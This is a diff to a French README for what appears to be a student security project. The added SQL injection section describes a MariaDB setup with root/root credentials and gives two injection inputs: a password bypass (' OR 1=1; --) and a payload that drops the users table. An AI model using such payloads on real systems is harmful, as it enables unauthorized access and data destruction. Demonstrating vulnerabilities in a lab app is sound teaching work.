@@ -51,8 +51,19 @@ password = test
 Entrez ensuite l'option 2 (view private data) : l'application devrait ainsi crasher puisque findProfile() retourne un pointeur NULL qui est par la suite déréférencé.
 
 ### SQL injection
-TODO : DA
+Pour que le projet fonctionne instaler mariadb et setup un user nommé root avec le password=root
+avoir une DB nommé sec_projet_db qui contient une table users avec les champs username et password
 
+Bypass le password du user test
+```bash
+username = test
+password = ' OR 1=1; --
+```
+DROP la table user
+```bash
+username = '; DROP TABLE users; -- '
+password = aa
+```
 
 # Application Rust
 ## Compilation
